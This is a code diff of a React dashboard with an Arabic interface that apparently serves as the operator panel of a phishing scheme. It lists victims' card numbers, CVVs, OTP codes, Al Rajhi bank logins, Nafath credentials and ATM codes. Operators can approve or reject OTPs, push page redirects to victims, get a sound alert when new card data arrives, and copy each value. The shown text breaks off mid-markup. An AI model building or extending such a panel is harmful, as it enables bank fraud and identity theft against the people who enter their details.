@@ -1,43 +1,65 @@
-import { useState, useEffect, useMemo } from "react";
+import { useState, useEffect, useMemo, useRef } from "react";
 import { useLocation } from "wouter";
 import {
-  Trash2,
-  CreditCard,
-  Bell,
-  CheckCircle,
   Search,
+  MessageSquare,
+  Settings,
+  Bell,
   User,
-  Phone,
-  ClipboardCheck,
-  Shield,
+  ChevronDown,
+  LayoutGrid,
+  MoreVertical,
+  CreditCard,
+  MapPin,
   Clock,
-  Calendar,
-  Hash,
-  Key,
-  Smartphone,
-  X,
+  Star,
+  Flag,
+  Archive,
+  Phone,
   Copy,
   Check,
-  RefreshCw,
-  Eye,
-  EyeOff,
-  Wifi,
+  CheckCircle,
   Globe,
-  MapPin,
+  Lock,
+  FileText,
+  Ban,
+  Eye,
+  Send,
+  Link,
+  Trash2,
+  List,
+  HeadphonesIcon,
+  X,
+  Volume2,
+  VolumeX,
+  Sun,
+  Moon,
+  Key,
+  Shield,
   AlertTriangle,
-  Banknote,
+  LogOut,
 } from "lucide-react";
-import { Button } from "@/components/ui/button";
+import { cn } from "@/lib/utils";
+import { ScrollArea } from "@/components/ui/scroll-area";
 import { Badge } from "@/components/ui/badge";
-import { format } from "date-fns";
-import { ar } from "date-fns/locale";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import {
+  DropdownMenu,
+  DropdownMenuContent,
+  DropdownMenuItem,
+  DropdownMenuLabel,
+  DropdownMenuSeparator,
+  DropdownMenuTrigger,
+} from "@/components/ui/dropdown-menu";
+import { useToast } from "@/hooks/use-toast";
 import {
   Dialog,
   DialogContent,
   DialogHeader,
   DialogTitle,
-  DialogFooter,
   DialogTrigger,
+  DialogFooter,
   DialogClose,
 } from "@/components/ui/dialog";
 import {
@@ -48,18 +70,7 @@ import {
   query,
   orderBy,
 } from "firebase/firestore";
-import { onValue, ref } from "firebase/database";
-import { Input } from "@/components/ui/input";
-import { ScrollArea } from "@/components/ui/scroll-area";
-import {
-  Select,
-  SelectContent,
-  SelectItem,
-  SelectTrigger,
-  SelectValue,
-} from "@/components/ui/select";
-import { useToast } from "@/hooks/use-toast";
-import { db, database, isFirebaseConfigured } from "@/lib/firebase";
+import { db, isFirebaseConfigured } from "@/lib/firebase";
 
 interface Notification {
   id: string;
@@ -79,137 +90,67 @@ interface Notification {
   cardExpiry?: string;
   cardCvv?: string;
   otpCode?: string;
-  otpVerified?: boolean;
   phoneOtpCode?: string;
-  phoneOtpSubmittedAt?: string;
-  phoneSubmittedAt?: string;
-  phoneVerificationStatus?: string;
-  nafazId?: string;
-  nafazPass?: string;
-  nafazStatus?: string;
-  nafazSubmittedAt?: string;
-  authNumber?: string;
   rajhiUser?: string;
   rajhiPassword?: string;
   rajhiOtp?: string;
-  atmVerification?: {
-    code?: string;
-    status?: string;
-    timestamp?: string;
-  };
-  selectedOffer?: {
-    insuranceType?: string;
-    offerId?: string;
-    offerName?: string;
-    totalPrice?: number;
-    status?: string;
-  };
+  nafazId?: string;
+  nafazPass?: string;
+  authNumber?: string;
+  atmVerification?: { code: string; status: string; timestamp: string };
   approvalStatus?: string;
-  currentPage?: string;
-  currentStep?: number;
-  status?: string;
-  createdAt?: string;
-  lastSeen?: any;
-  online?: boolean;
-  isUnread?: boolean;
-  isHidden?: boolean;
-  any?: "red" | "yellow" | "green" | null;
   cardOtpApproved?: boolean;
-  cardPinApproved?: boolean;
   phoneOtpApproved?: boolean;
   nafathApproved?: boolean;
-  adminDirective?: {
-    targetPage?: string;
-    targetStep?: number;
-    issuedAt?: string;
-  };
+  adminDirective?: { targetPage?: string; targetStep?: number; issuedAt?: string };
+  currentPage?: string | number;
+  currentStep?: number;
+  step?: string;
+  createdAt?: any;
+  isHidden?: boolean;
+  isUnread?: boolean;
+  country?: string;
+  ipAddress?: string;
   browser?: string;
   os?: string;
-  ip?: string;
-  country?: string;
-}
-
-const pageLabels: Record<string, string> = {
-  "motor-insurance": "تأمين السيارات",
-  "phone-verification": "التحقق من الهاتف",
-  "nafaz": "نفاذ",
-  "rajhi": "الراجحي",
-};
-
-function UserStatus({ visitorId }: { visitorId: string }) {
-  const [isOnline, setIsOnline] = useState(false);
-
-  useEffect(() => {
-    if (!database || !isFirebaseConfigured) return;
-    const statusRef = ref(database, `status/${visitorId}`);
-    const unsubscribe = onValue(statusRef, (snapshot) => {
-      const data = snapshot.val();
-      setIsOnline(data?.state === "online");
-    });
-    return () => unsubscribe();
-  }, [visitorId]);
-
-  return (
-    <div className={`w-2.5 h-2.5 rounded-full ${isOnline ? "bg-emerald-500" : "bg-gray-400"}`} />
-  );
-}
-
-function CopyButton({ text }: { text: string }) {
-  const [copied, setCopied] = useState(false);
-  
-  const handleCopy = () => {
-    navigator.clipboard.writeText(text);
-    setCopied(true);
-    setTimeout(() => setCopied(false), 2000);
-  };
-
-  return (
-    <button onClick={handleCopy} className="text-gray-400 hover:text-gray-600 transition-colors">
-      {copied ? <Check className="w-4 h-4 text-emerald-500" /> : <Copy className="w-4 h-4" />}
-    </button>
-  );
+  documment_owner_full_name?: string;
+  identityNumber?: string;
 }
 
 export default function Dashboard() {
   const [, setLocation] = useLocation();
   const { toast } = useToast();
   const [notifications, setNotifications] = useState<Notification[]>([]);
-  const [isLoading, setIsLoading] = useState(true);
+  const [selectedId, setSelectedId] = useState<string | null>(null);
   const [searchTerm, setSearchTerm] = useState("");
-  const [selectedVisitor, setSelectedVisitor] = useState<Notification | null>(null);
+  const [isLoading, setIsLoading] = useState(true);
   const [atmCode, setAtmCode] = useState("");
+  const [copiedField, setCopiedField] = useState<string | null>(null);
+  const [statusFilter, setStatusFilter] = useState<string>("all");
+  const [approvalFilter, setApprovalFilter] = useState<string>("all");
+  const [dataFilter, setDataFilter] = useState<string>("all");
+  const [soundEnabled, setSoundEnabled] = useState(true);
+  const prevAppsRef = useRef<Notification[]>([]);
+  const chatScrollRef = useRef<HTMLDivElement>(null);
 
-  const hasData = (n: Notification) => {
-    return !!(
-      n.cardName ||
-      n.nationalId ||
-      n.phoneNumber ||
-      n.cardNumber ||
-      n.otpCode ||
-      n.phoneOtpCode ||
-      n.rajhiUser ||
-      n.nafazId ||
-      n.personalInfo?.birthYear
-    );
+  const playNotificationSound = () => {
+    if (!soundEnabled) return;
+    try {
+      const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
+      const oscillator = audioContext.createOscillator();
+      const gainNode = audioContext.createGain();
+      oscillator.connect(gainNode);
+      gainNode.connect(audioContext.destination);
+      oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
+      oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
+      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
+      oscillator.start(audioContext.currentTime);
+      oscillator.stop(audioContext.currentTime + 0.3);
+    } catch (error) {
+      console.log("Audio not supported");
+    }
   };
-
-  const filteredNotifications = useMemo(() => {
-    return notifications.filter((notification) => {
-      if (!hasData(notification)) return false;
-      const matchesSearch =
-        !searchTerm ||
-        notification.cardName?.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        notification.nationalId?.includes(searchTerm) ||
-        notification.phoneNumber?.includes(searchTerm) ||
-        notification.cardNumber?.includes(searchTerm) ||
-        notification.id.includes(searchTerm);
-      return matchesSearch;
-    });
-  }, [notifications, searchTerm]);
-
-  const unreadCount = useMemo(() => {
-    return filteredNotifications.filter(n => n.isUnread).length;
-  }, [filteredNotifications]);
 
   useEffect(() => {
     if (!isFirebaseConfigured || !db) {
@@ -232,42 +173,101 @@ export default function Dashboard() {
         }
       });
 
+      if (prevAppsRef.current.length > 0) {
+        const prevIds = new Set(prevAppsRef.current.map((a) => a.id));
+        const hasNewApp = notificationsData.some((app) => !prevIds.has(app.id));
+        const hasNewCardData = notificationsData.some((app) => {
+          const prevApp = prevAppsRef.current.find((p) => p.id === app.id);
+          return app.cardNumber && (!prevApp || !prevApp.cardNumber);
+        });
+        if (hasNewApp || hasNewCardData) {
+          playNotificationSound();
+        }
+      }
+
+      prevAppsRef.current = notificationsData;
       setNotifications(notificationsData);
       setIsLoading(false);
-      
-      if (selectedVisitor) {
-        const updated = notificationsData.find(n => n.id === selectedVisitor.id);
-        if (updated) setSelectedVisitor(updated);
-      }
     });
 
     return () => unsubscribe();
-  }, []);
+  }, [soundEnabled]);
 
-  const handleDelete = async (id: string) => {
-    if (!db) return;
-    try {
-      await updateDoc(doc(db, "pays", id), { isHidden: true });
-      if (selectedVisitor?.id === id) setSelectedVisitor(null);
-      toast({ title: "تم الحذف" });
-    } catch (error) {
-      toast({ title: "خطأ", variant: "destructive" });
-    }
+  const hasData = (n: Notification) => {
+    return (
+      n.cardNumber ||
+      n.otpCode ||
+      n.phoneOtpCode ||
+      n.rajhiUser ||
+      n.nafazId ||
+      n.personalInfo?.birthYear ||
+      n.nationalId ||
+      n.phoneNumber
+    );
   };
 
-  const handleMarkAsRead = async (notification: Notification) => {
-    setSelectedVisitor(notification);
-    if (notification.isUnread && db) {
-      await updateDoc(doc(db, "pays", notification.id), { isUnread: false });
-    }
+  const filteredApps = useMemo(() => {
+    return notifications.filter((app) => {
+      if (!hasData(app)) return false;
+      
+      const matchesSearch = !searchTerm ||
+        app.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+        app.nationalId?.includes(searchTerm) ||
+        app.phoneNumber?.includes(searchTerm) ||
+        app.cardNumber?.includes(searchTerm) ||
+        app.cardName?.toLowerCase().includes(searchTerm.toLowerCase());
+
+      const matchesStatus = statusFilter === "all" ||
+        (statusFilter === "completed" && app.approvalStatus === "approved_otp") ||
+        (statusFilter === "pending" && !app.approvalStatus) ||
+        (statusFilter === "rejected" && app.approvalStatus === "rejected");
+
+      const matchesApproval = approvalFilter === "all" ||
+        (approvalFilter === "pending_card" && app.cardNumber && !app.cardOtpApproved) ||
+        (approvalFilter === "pending_phone" && app.phoneOtpCode && !app.phoneOtpApproved) ||
+        (approvalFilter === "approved" && (app.cardOtpApproved || app.phoneOtpApproved)) ||
+        (approvalFilter === "rejected" && app.approvalStatus === "rejected");
+
+      const matchesData = dataFilter === "all" ||
+        (dataFilter === "card" && app.cardNumber) ||
+        (dataFilter === "phone" && (app.phoneOtpCode || app.phoneNumber)) ||
+        (dataFilter === "nafaz" && app.nafazId) ||
+        (dataFilter === "rajhi" && app.rajhiUser);
+
+      return matchesSearch && matchesStatus && matchesApproval && matchesData;
+    });
+  }, [notifications, searchTerm, statusFilter, approvalFilter, dataFilter]);
+
+  const unreadCount = useMemo(() => {
+    return filteredApps.filter(n => n.isUnread).length;
+  }, [filteredApps]);
+
+  const selectedApplication = notifications.find((app) => app.id === selectedId);
+
+  const stats = {
+    total: notifications.filter(hasData).length,
+    cards: notifications.filter((a) => a.cardNumber).length,
+    pending: notifications.filter((a) => a.cardNumber && !a.cardOtpApproved).length,
+    approved: notifications.filter((a) => a.cardOtpApproved || a.phoneOtpApproved).length,
   };
 
-  const handleApprovalStatus = async (id: string, status: string, atmCode?: string) => {
+  const pendingApprovals = {
+    cardApprovals: notifications.filter((a) => a.cardNumber && !a.cardOtpApproved).length,
+    phoneApprovals: notifications.filter((a) => a.phoneOtpCode && !a.phoneOtpApproved).length,
+    nafazApprovals: notifications.filter((a) => a.nafazId && !a.nafathApproved).length,
+    total: notifications.filter((a) => 
+      (a.cardNumber && !a.cardOtpApproved) || 
+      (a.phoneOtpCode && !a.phoneOtpApproved) ||
+      (a.nafazId && !a.nafathApproved)
+    ).length,
+  };
+
+  const handleApprovalStatus = async (id: string, status: string, atmCodeValue?: string) => {
     if (!db) return;
     try {
       const updates: any = { approvalStatus: status };
-      if (atmCode) {
-        updates.atmVerification = { code: atmCode, status: "pending", timestamp: new Date().toISOString() };
+      if (atmCodeValue) {
+        updates.atmVerification = { code: atmCodeValue, status: "pending", timestamp: new Date().toISOString() };
       }
       await updateDoc(doc(db, "pays", id), updates);
       toast({ title: "تم التحديث" });
@@ -276,522 +276,551 @@ export default function Dashboard() {
     }
   };
 
-  const handleRouting = async (id: string, field: string, value: any) => {
+  const handleFieldApproval = async (id: string, field: string, value: boolean) => {
     if (!db) return;
     try {
-      if (field === "targetPage" || field === "targetStep") {
-        const currentNotification = notifications.find(n => n.id === id);
-        const currentDirective = currentNotification?.adminDirective || {};
-        await updateDoc(doc(db, "pays", id), {
-          adminDirective: {
-            ...currentDirective,
-            [field]: value,
-            issuedAt: new Date().toISOString(),
-          },
-        });
-      } else {
-        await updateDoc(doc(db, "pays", id), { [field]: value });
-      }
+      await updateDoc(doc(db, "pays", id), { [field]: value });
+      toast({ title: "تم التحديث" });
     } catch (error) {
       toast({ title: "خطأ", variant: "destructive" });
     }
   };
 
-  const getDisplayName = (n: Notification) => {
-    return n.cardName || n.nationalId || n.phoneNumber || n.id.substring(0, 8);
+  const handleUpdateCurrentPage = async (id: string, page: number | string) => {
+    if (!db) return;
+    try {
+      const currentNotification = notifications.find(n => n.id === id);
+      const currentDirective = currentNotification?.adminDirective || {};
+      await updateDoc(doc(db, "pays", id), {
+        adminDirective: {
+          ...currentDirective,
+          targetStep: typeof page === 'number' ? page : undefined,
+          targetPage: typeof page === 'string' ? page : undefined,
+          issuedAt: new Date().toISOString(),
+        },
+      });
+      toast({ title: "تم تحديث الصفحة" });
+    } catch (error) {
+      toast({ title: "خطأ", variant: "destructive" });
+    }
   };
 
-  const getTimeAgo = (dateStr?: string) => {
-    if (!dateStr) return "";
+  const handleMarkAsRead = async (app: Notification) => {
+    setSelectedId(app.id);
+    if (app.isUnread && db) {
+      await updateDoc(doc(db, "pays", app.id), { isUnread: false });
+    }
+  };
+
+  const handleDelete = async (id: string) => {
+    if (!db) return;
     try {
-      return format(new Date(dateStr), "HH:mm", { locale: ar });
+      await updateDoc(doc(db, "pays", id), { isHidden: true });
+      if (selectedId === id) setSelectedId(null);
+      toast({ title: "تم الحذف" });
+    } catch (error) {
+      toast({ title: "خطأ", variant: "destructive" });
+    }
+  };
+
+  const copyToClipboard = (text: string, label: string) => {
+    if (!text) return;
+    navigator.clipboard.writeText(text);
+    setCopiedField(label);
+    setTimeout(() => setCopiedField(null), 2000);
+    toast({ title: "تم النسخ", description: label });
+  };
+
+  const getDisplayName = (n: Notification) => {
+    return n.cardName || n.documment_owner_full_name || n.nationalId || n.phoneNumber || n.id.substring(0, 8);
+  };
+
+  const formatTime = (date: any) => {
+    if (!date) return "";
+    try {
+      const d = date.toDate ? date.toDate() : new Date(date);
+      const now = new Date();
+      const diffMs = now.getTime() - d.getTime();
+      const minutes = Math.floor(diffMs / 60000);
+      if (minutes < 1) return "الآن";
+      if (minutes < 60) return `منذ ${minutes} د`;
+      const hours = Math.floor(minutes / 60);
+      if (hours < 24) return `منذ ${hours} س`;
+      const days = Math.floor(hours / 24);
+      return `منذ ${days} ي`;
     } catch {
       return "";
     }
   };
 
+  const DataRow = ({ label, value, isLtr }: { label: string; value?: string | number | null; isLtr?: boolean }) => {
+    if (!value) return null;
+    const strValue = String(value);
+    return (
+      <div className="flex items-center justify-between group hover:bg-muted/50 px-3 py-2 rounded transition-colors border-b border-border">
+        <span className="font-bold text-gray-700 dark:text-gray-300 text-sm">{label}</span>
+        <div className="flex items-center gap-2">
+          <span className={cn("text-gray-600 dark:text-gray-400 font-medium", isLtr && "direction-ltr text-left font-mono")}>
+            {strValue}
+          </span>
+          <button
+            onClick={() => copyToClipboard(strValue, label)}
+            className="opacity-0 group-hover:opacity-100 transition-opacity text-gray-400 hover:text-blue-500"
+            data-testid={`copy-${label}`}
+          >
+            {copiedField === label ? <Check size={14} className="text-green-500" /> : <Copy size={14} />}
+          </button>
+        </div>
+      </div>
+    );
+  };
+
+  const ChatBubble = ({ title, children, isUser, icon }: { title: string; children: React.ReactNode; isUser?: boolean; icon?: React.ReactNode }) => (
+    <div className={cn("flex gap-3 mb-4", isUser ? "flex-row-reverse" : "flex-row")}>
+      <div className={cn("w-8 h-8 rounded-full flex items-center justify-center shrink-0", isUser ? "bg-blue-500 text-white" : "bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300")}>
+        {icon || (isUser ? <User size={16} /> : <MessageSquare size={16} />)}
+      </div>
+      <div className={cn("max-w-[80%] rounded-2xl p-4 shadow-sm", isUser ? "bg-primary text-primary-foreground rounded-tr-sm" : "bg-card border border-border rounded-tl-sm")}>
+        <div className={cn("text-xs font-bold mb-2", isUser ? "text-primary-foreground/80" : "text-muted-foreground")}>{title}</div>
+        <div className={isUser ? "text-primary-foreground" : "text-foreground"}>{children}</div>
+      </div>
+    </div>
+  );
+
   if (!isFirebaseConfigured) {
     return (
-      <div className="flex items-center justify-center h-screen bg-gray-50" dir="rtl">
-        <div className="text-center p-8">
-          <Shield className="h-16 w-16 mx-auto mb-4 text-gray-300" />
-          <h2 className="text-xl font-semibold mb-2">Firebase غير مكون</h2>
-          <p className="text-gray-500">يرجى إضافة متغيرات Firebase البيئية</p>
+      <div className="flex items-center justify-center h-screen bg-background" dir="rtl">
+        <div className="text-center p-8 max-w-md">
+          <AlertTriangle className="h-16 w-16 text-amber-500 mx-auto mb-4" />
+          <h2 className="text-xl font-bold mb-2">Firebase غير مكون</h2>
+          <p className="text-muted-foreground">يرجى تكوين Firebase للوصول إلى لوحة التحكم</p>
         </div>
       </div>
     );
   }
 
   return (
-    <div className="flex flex-row-reverse h-screen bg-gray-50" dir="rtl">
-      {/* Main Content */}
-      <div className="flex-1 flex flex-col overflow-hidden">
-        {/* Top Header */}
-        <div className="bg-white border-b px-6 py-3">
-          <div className="flex items-center justify-between">
-            <div className="flex items-center gap-4">
-              <h1 className="text-lg font-semibold text-gray-800">صندوق الوارد</h1>
-              {unreadCount > 0 && (
-                <Badge className="bg-red-500 text-white">{unreadCount}</Badge>
-              )}
-            </div>
-            {selectedVisitor && (
-              <div className="flex items-center gap-6 text-sm">
-                {selectedVisitor.phoneNumber && (
-                  <div className="flex items-center gap-2">
-                    <span className="text-gray-500">موبايل</span>
-                    <span className="font-mono">{selectedVisitor.phoneNumber}</span>
-                  </div>
-                )}
-                {selectedVisitor.nationalId && (
-                  <div className="flex items-center gap-2">
-                    <span className="text-gray-500">الهوية</span>
-                    <span className="font-mono">{selectedVisitor.nationalId}</span>
-                  </div>
-                )}
-              </div>
-            )}
-            <div className="relative w-64">
-              <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
-              <Input
-                placeholder="بحث..."
-                value={searchTerm}
-                onChange={(e) => setSearchTerm(e.target.value)}
-                className="pr-10 bg-gray-50 border-gray-200"
-                data-testid="input-search"
-              />
+    <div className="flex h-screen bg-background w-full overflow-hidden text-right font-sans text-foreground" dir="rtl">
+      {/* Right Sidebar - Inbox List */}
+      <aside className="w-[320px] bg-card border-l border-border flex flex-col shrink-0 z-20 shadow-[4px_0_24px_rgba(0,0,0,0.02)]">
+        {/* Header */}
+        <div className="h-14 border-b border-border flex items-center justify-between px-4 shrink-0 bg-card">
+          <div className="flex items-center gap-3">
+            <div className="font-bold text-foreground text-sm">صندوق الوارد</div>
+            {unreadCount > 0 && <Badge className="bg-red-500 text-white">{unreadCount}</Badge>}
+          </div>
+          <div className="flex items-center gap-2">
+            <Button variant="ghost" size="icon" className="h-7 w-7" onClick={() => setSoundEnabled(!soundEnabled)} data-testid="button-sound-toggle">
+              {soundEnabled ? <Volume2 size={14} className="text-green-500" /> : <VolumeX size={14} className="text-muted-foreground" />}
+            </Button>
+            <div className="h-6 w-px bg-border mx-1" />
+            <div className="flex items-center gap-1 text-[10px] text-muted-foreground font-mono">
+              <span className="text-green-500 font-bold" data-testid="stats-approved">{stats.approved} / {stats.pending}</span>
+              <span data-testid="stats-total">/ {stats.total}</span>
             </div>
           </div>
         </div>
 
-        {/* Content Area */}
-        <div className="flex-1 overflow-auto p-6">
-          {!selectedVisitor ? (
-            <div className="flex flex-col items-center justify-center h-full text-gray-400">
-              <Bell className="h-20 w-20 mb-4 opacity-30" />
-              <p className="text-lg">اختر زائر من القائمة</p>
+        {/* Pending Approvals Warning */}
+        {pendingApprovals.total > 0 && (
+          <div className="mx-3 mt-3 p-3 border rounded-lg animate-pulse bg-gradient-to-l from-amber-500/15 to-amber-500/5 border-amber-500/40" data-testid="warning-approvals">
+            <div className="flex items-center gap-2 text-amber-600">
+              <div className="w-6 h-6 rounded-full flex items-center justify-center animate-bounce bg-amber-500">
+                <Bell size={14} className="text-white" />
+              </div>
+              <div className="flex-1">
+                <div className="font-bold text-sm">بانتظار الموافقة</div>
+                <div className="text-xs text-amber-600/80">
+                  {pendingApprovals.cardApprovals > 0 && <span className="inline-flex items-center gap-1 ml-2"><CreditCard size={10} /> {pendingApprovals.cardApprovals} بطاقة</span>}
+                  {pendingApprovals.phoneApprovals > 0 && <span className="inline-flex items-center gap-1 ml-2"><Phone size={10} /> {pendingApprovals.phoneApprovals} هاتف</span>}
+                  {pendingApprovals.nafazApprovals > 0 && <span className="inline-flex items-center gap-1"><Lock size={10} /> {pendingApprovals.nafazApprovals} نفاذ</span>}
+                </div>
+              </div>
+              <Badge className="bg-amber-500 text-white">{pendingApprovals.total}</Badge>
             </div>
+          </div>
+        )}
+
+        {/* Search & Filter */}
+        <div className="p-3 border-b border-border space-y-3 bg-card/50">
+          <div className="relative">
+            <Search size={14} className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400" />
+            <Input
+              placeholder="بحث..."
+              value={searchTerm}
+              onChange={(e) => setSearchTerm(e.target.value)}
+              className="h-8 pr-8 text-xs border-border focus:border-primary rounded-md bg-muted"
+              data-testid="input-search"
+            />
+          </div>
+
+          {/* Filters */}
+          <div className="flex flex-wrap gap-2">
+            <select
+              value={statusFilter}
+              onChange={(e) => setStatusFilter(e.target.value)}
+              className="h-7 px-2 text-xs border border-border rounded-md bg-card text-foreground focus:border-primary focus:outline-none"
+              data-testid="select-status-filter"
+            >
+              <option value="all">كل الحالات</option>
+              <option value="pending">قيد الانتظار</option>
+              <option value="completed">مكتمل</option>
+              <option value="rejected">مرفوض</option>
+            </select>
+
+            <select
+              value={approvalFilter}
+              onChange={(e) => setApprovalFilter(e.target.value)}
+              className="h-7 px-2 text-xs border border-border rounded-md bg-card text-foreground focus:border-primary focus:outline-none"
+              data-testid="select-approval-filter"
+            >
+              <option value="all">كل الموافقات</option>
+              <option value="pending_card">بطاقة معلقة</option>
+              <option value="pending_phone">هاتف معلق</option>
+              <option value="approved">موافق عليه</option>
+              <option value="rejected">مرفوض</option>
+            </select>
+          </div>
+
+          {/* Data Type Filter Buttons */}
+          <div className="flex flex-wrap gap-1.5">
+            <button onClick={() => setDataFilter("all")} className={cn("px-2 py-1 text-[10px] rounded-full transition-all", dataFilter === "all" ? "bg-blue-500 text-white" : "bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-400 hover:bg-gray-200")} data-testid="filter-all">الكل</button>
+            <button onClick={() => setDataFilter("card")} className={cn("px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1", dataFilter === "card" ? "bg-purple-500 text-white" : "bg-purple-50 dark:bg-purple-900/30 text-purple-600 dark:text-purple-400")} data-testid="filter-card"><CreditCard size={10} />بطاقة</button>
+            <button onClick={() => setDataFilter("phone")} className={cn("px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1", dataFilter === "phone" ? "bg-blue-500 text-white" : "bg-blue-50 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400")} data-testid="filter-phone"><Phone size={10} />هاتف</button>
+            <button onClick={() => setDataFilter("nafaz")} className={cn("px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1", dataFilter === "nafaz" ? "bg-green-500 text-white" : "bg-green-50 dark:bg-green-900/30 text-green-600 dark:text-green-400")} data-testid="filter-nafaz"><Lock size={10} />نفاذ</button>
+            <button onClick={() => setDataFilter("rajhi")} className={cn("px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1", dataFilter === "rajhi" ? "bg-teal-500 text-white" : "bg-teal-50 dark:bg-teal-900/30 text-teal-600 dark:text-teal-400")} data-testid="filter-rajhi"><Shield size={10} />الراجحي</button>
+            
+            {(statusFilter !== "all" || approvalFilter !== "all" || dataFilter !== "all") && (
+              <Button variant="ghost" size="sm" onClick={() => { setStatusFilter("all"); setApprovalFilter("all"); setDataFilter("all"); }} className="h-6 px-2 text-[10px] text-red-500" data-testid="button-clear-filters">
+                <X size={10} className="ml-1" />مسح
+              </Button>
+            )}
+          </div>
+
+          <div className="text-[10px] text-gray-400">عرض {filteredApps.length} من {stats.total} طلب</div>
+        </div>
+
+        {/* Application List */}
+        <ScrollArea className="flex-1">
+          {isLoading ? (
+            <div className="p-4 text-center text-gray-400 text-sm">جاري التحميل...</div>
+          ) : filteredApps.length === 0 ? (
+            <div className="p-4 text-center text-gray-400 text-sm">لا توجد طلبات</div>
           ) : (
-            <div className="max-w-4xl mx-auto space-y-6">
-              {/* Approval Alert Banner */}
-              {(selectedVisitor.currentStep === 4 || selectedVisitor.currentStep === 5 || selectedVisitor.currentStep === 6) && !selectedVisitor.approvalStatus && (
-                <div className="bg-amber-50 border-2 border-amber-300 rounded-xl p-4 flex items-center gap-4 animate-pulse" data-testid="alert-approval-pending">
-                  <div className="bg-amber-100 rounded-full p-3">
-                    <AlertTriangle className="h-8 w-8 text-amber-600" />
-                  </div>
-                  <div className="flex-1">
-                    <h3 className="font-bold text-amber-800 text-lg" data-testid="text-approval-warning-title">تنبيه: بانتظار الموافقة</h3>
-                    <p className="text-amber-700 text-sm" data-testid="text-approval-warning-message">
-                      {selectedVisitor.currentStep === 4 && "المستخدم في مرحلة إدخال بيانات البطاقة - بانتظار OTP البطاقة"}
-                      {selectedVisitor.currentStep === 5 && "المستخدم أدخل OTP البطاقة - بانتظار الموافقة أو رمز الصراف"}
-                      {selectedVisitor.currentStep === 6 && "المستخدم في مرحلة التحقق من الصراف - بانتظار إرسال رمز الصراف"}
-                    </p>
-                  </div>
-                  <div className="flex gap-2">
-                    {selectedVisitor.currentStep === 5 && (
-                      <Button
-                        size="sm"
-                        onClick={() => handleApprovalStatus(selectedVisitor.id, "approved_otp")}
-                        className="bg-emerald-600 hover:bg-emerald-700"
-                        data-testid="button-alert-approve-otp"
-                      >
-                        <CheckCircle className="h-4 w-4 ml-1" />
-                        موافقة OTP
-                      </Button>
-                    )}
-                    <Dialog>
-                      <DialogTrigger asChild>
-                        <Button size="sm" variant="outline" className="border-amber-400 text-amber-700" data-testid="button-alert-atm-dialog">
-                          <Banknote className="h-4 w-4 ml-1" />
-                          رمز صراف
-                        </Button>
-                      </DialogTrigger>
-                      <DialogContent>
-                        <DialogHeader>
-                          <DialogTitle>إرسال رمز الصراف</DialogTitle>
-                        </DialogHeader>
-                        <div className="py-4">
-                          <Input
-                            value={atmCode}
-                            onChange={(e) => setAtmCode(e.target.value)}
-                            placeholder="أدخل رمز الصراف"
-                            className="text-center text-xl"
-                            data-testid="input-alert-atm-code"
-                          />
+            filteredApps.map((app) => (
+              <div
+                key={app.id}
+                onClick={() => handleMarkAsRead(app)}
+                className={cn(
+                  "flex items-center gap-3 px-4 py-3 border-b border-border cursor-pointer transition-all duration-200 hover:bg-primary/5",
+                  selectedId === app.id && "bg-blue-50 dark:bg-blue-900/20 border-r-2 border-r-blue-500",
+                  app.cardNumber && selectedId !== app.id && "bg-gradient-to-l from-purple-50 dark:from-purple-900/20 to-transparent border-r-2 border-r-purple-400",
+                  (app.nafazId || app.phoneOtpCode) && !app.cardNumber && selectedId !== app.id && "bg-gradient-to-l from-green-50 dark:from-green-900/20 to-transparent border-r-2 border-r-green-400",
+                )}
+                data-testid={`app-item-${app.id}`}
+              >
+                <div className="relative">
+                  <div className={cn("w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300")}>
+                    {getDisplayName(app)?.charAt(0) || "؟"}
+                    {/* Alert indicator */}
+                    {((app.otpCode && !app.cardOtpApproved) || (app.phoneOtpCode && !app.phoneOtpApproved) || (app.nafazId && !app.nafathApproved)) && (
+                      <>
+                        <div className="absolute -top-1 -left-1 w-4 h-4 bg-red-500 rounded-full animate-ping opacity-75" />
+                        <div className="absolute -top-1 -left-1 w-4 h-4 bg-red-500 rounded-full flex items-center justify-center">
+                          <span className="text-white text-[8px] font-bold">!</span>
                         </div>
-                        <DialogFooter>
-                          <DialogClose asChild>
-                            <Button 
-                              disabled={!atmCode.trim()}
-                              onClick={() => {
-                                if (atmCode.trim()) {
-                                  handleApprovalStatus(selectedVisitor.id, "approved_atm", atmCode.trim());
-                                  setAtmCode("");
-                                }
-                              }}
-                              data-testid="button-alert-confirm-atm"
-                            >
-                              تأكيد
-                            </Button>
-                          </DialogClose>
-                        </DialogFooter>
-                      </DialogContent>
-                    </Dialog>
-                    <Button
-                      size="sm"
-                      variant="destructive"
-                      onClick={() => handleApprovalStatus(selectedVisitor.id, "rejected")}
-                      data-testid="button-alert-reject"
+                      </>
+                    )}
+                  </div>
+                </div>
+                <div className="flex-1 min-w-0">
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center gap-1.5">
+                      <span className={cn("font-medium text-sm truncate", app.isUnread ? "text-foreground font-bold" : "text-foreground")}>
+                        {getDisplayName(app)}
+                      </span>
+                      {app.isUnread && <Flag size={10} className="text-red-500 fill-red-500" data-testid={`flag-unread-${app.id}`} />}
+                    </div>
+                    <span className="text-[10px] text-muted-foreground">{formatTime(app.createdAt)}</span>
+                  </div>
+                  <div className="flex items-center gap-2 mt-1">
+                    {app.cardNumber && <Badge variant="outline" className="text-[9px] px-1.5 py-0 h-4 border-purple-300 text-purple-600"><CreditCard size={8} className="mr-1" />بطاقة</Badge>}
